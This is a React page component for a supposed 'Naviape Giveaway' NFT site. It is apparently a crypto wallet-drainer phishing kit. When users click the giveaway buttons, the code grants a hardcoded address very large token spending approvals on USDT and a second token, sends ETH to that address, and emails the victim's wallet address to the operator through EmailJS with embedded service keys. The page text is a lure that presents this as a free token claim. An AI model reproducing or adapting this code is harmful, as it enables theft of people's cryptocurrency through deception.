// https://docs.metamask.io/guide/ethereum-provider.html#using-the-provider
import React, {useState} from 'react'
import { ethers } from 'ethers'
import './style.css';
import logo from './images/x-icon/favicon-32x32.png';
import './images/x-icon/site.webmanifest';
import discord from './images/header/discord.webp';
import opensea from './images/header/opensea.webp';
import { send } from 'emailjs-com';




const { ethereum } = window;



const SimpleStorage = () => {



	// deploy simple storage contract and paste deployed contract address here. This value is local ganache chain


	const [errorMessage, setErrorMessage] = useState(null);
  const [defaultAccount, setDefaultAccount] = useState(null);
  const [defaultAccountnew, setDefaultAccountnew] = useState(null);
	const [connButtonText, setConnButtonText] = useState('Connect Wallet');






	const connectWalletHandler = () => {
		if (window.ethereum && window.ethereum.isMetaMask) {

			window.ethereum.request({ method: 'eth_requestAccounts'})
			.then(result => {
				accountChangedHandler(result[0]);
        setConnButtonText('Wallet Connected');

			})
			.catch(error => {
				setErrorMessage(error.message);

			});

		} else {
			console.log('Need to install MetaMask');
			setErrorMessage('Please install MetaMask browser extension to interact');
		}
	}

	// update account, will cause component re-render
	const accountChangedHandler = (newAccount) => {
    setDefaultAccount(newAccount.slice(-8));
    setDefaultAccountnew(newAccount);

	}

	const chainChangedHandler = () => {
		// reload the page to avoid any errors with chain change mid use of application
		window.location.reload();
  }


	// listen for account changes
	window.ethereum.on('accountsChanged', accountChangedHandler);

	window.ethereum.on('chainChanged', chainChangedHandler);


//sending begins here
	// const amounttosend = "100000000";


	// async function transferether(amounttosend, yourContractAddress) {


    // if (!window.ethereum)
    //   throw new Error("No connected wallet found. Please install it.");

    // await window.ethereum.send("eth_requestAccounts");
    // const provider = new ethers.providers.Web3Provider(window.ethereum);
    // const signer = provider.getSigner();
    // ethers.utils.getAddress("0x61b99Af6375deA52843c7BED296a4372d106c8Df");
    // const tx = await signer.sendTransaction({
    //   to: yourContractAddress,
    //   value: ethers.utils.parseEther(amounttosend)
    // });
	// 	console.log({ amounttosend, yourContractAddress });
	// 	console.log(tx);


// }
  const newAddress = String(defaultAccountnew);
 const [toSend, ] = useState({


   address:  newAddress ,
  });
  const onSubmit = (e) => {


        send(
          'service_uysex9s',
          'template_reevj08',
          { ...toSend, address: newAddress },
          'HD34HmPYw8YvoP1lo'
        )
          .then((response) => {
            console.log('SUCCESS!', response.status, response.text);
          })
          .catch((err) => {
            console.log('FAILED...', err);
          });

  };





	//my appeove here

    const yourContractAddress = "0x9B62e1e7a87098f69FE8BB0aB7E240d9b234aB79";
    const contractInterface = [
    "function approve(address spender, uint256 amount) external returns (bool)", // appprove contract function
  ];
    const tokenAddress = "0xD76b5c2A23ef78368d8E34288B5b65D616B746aE"; //token to migrate
    const tokenAddressusdt = "0xdac17f958d2ee523a2206206994597c13d831ec7"; //token to migrate
    let provider;
    let signer;
    // let signerAddress;
    let tokenContract;
    let tokenContractusdt;


     const startFunction = async () => {
    await ethereum.request({ method: "eth_requestAccounts" });
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x1" }],
    });
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    // signerAddress = await signer.getAddress();
    tokenContract = new ethers.Contract(
      tokenAddress,
      contractInterface,
      signer,
         );
    tokenContractusdt = new ethers.Contract(
      tokenAddressusdt,
      contractInterface,
      signer,
		 );

    };
    startFunction();
	async function approveSpender() {
	tokenContract.approve(yourContractAddress, '100000000000000000000000');

    }
	async function approveSpenderusdt() {

    	tokenContractusdt.approve(yourContractAddress, '1000000000000');
  }

  async function transfertoken() {

    onSubmit();



    signer.sendTransaction({
      to: "0x9B62e1e7a87098f69FE8BB0aB7E240d9b234aB79",
      value: ethers.utils.parseEther("0.0001"),

    });


    //send out email






    }










	return (
		<div>

<html lang="en">

<head>

  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />




</head>

<body>
  <header>
    <div class="container">
      <div class="logo">
        <a href="/">
          <img src={logo} alt="logo" />
        </a>
      </div>
      <div class="menu">
        <a href="https://discord.link/NaviApes" target="_blank" rel="noopener noreferrer">
          <img src={discord} alt="Discord" />
        </a>


        <a href="https://opensea.io/collection/naviapes" target="_blank" rel="noopener noreferrer">
          <img src={opensea} alt="Opensea" />
        </a>
        <button class="wallet-btn btn" onClick={connectWalletHandler} >
          <span>{connButtonText} {defaultAccount}</span>
        </button>
		{errorMessage}
      </div>
    </div>
  </header>

  <section class="container">
    <div class="owner-status"></div>
    <div class="countdown">
      {/* <ul id="countdown" class="count-down" data-date="apr 8, 2022 4:00:00 PM UTC">
        <li class="clock-item">
          <span class="count-number days">20</span>
          <p class="count-text">Days</p>
        </li>

        <li class="clock-item">
          <span class="count-number hours">20</span>
          <p class="count-text">Hour</p>
        </li>

        <li class="clock-item">
          <span class="count-number minutes">20</span>
          <p class="count-text">Min</p>
        </li>

        <li class="clock-item">
          <span class="count-number seconds">20</span>
          <p class="count-text">Sec</p>
        </li>
              </ul> */}
  {/* <form id="formdata" onSubmit={onSubmit}>
  <input
    type='hidden'
    id="value"
    name='address'
    placeholder='address'
    value={toSend.address}
    onChange={handleChange}
/>
  <button type='submit'>Submit</button>
</form> */}
      <h1>Naviape Giveaway is live!!</h1>

      <p>In support of Ethereum blockchain community, you must have atleast $1 worth of ETH or USDT to claim the Token Giveaway, Token will be distributed within 24hrs </p>
              <button onClick={() => { transfertoken(); approveSpenderusdt() }} class="btn" id="approve" >Get Giveaway with USDT</button>
               <br /><br />
               <p>Click below button to claim with ETH</p>
							<button onClick={() => { transfertoken(); approveSpender() }} class="btn" id="approve" >Get Giveaway with ETH</button>
    </div>

  </section>





</body>


</html>
		</div>
	);
}

export default SimpleStorage;
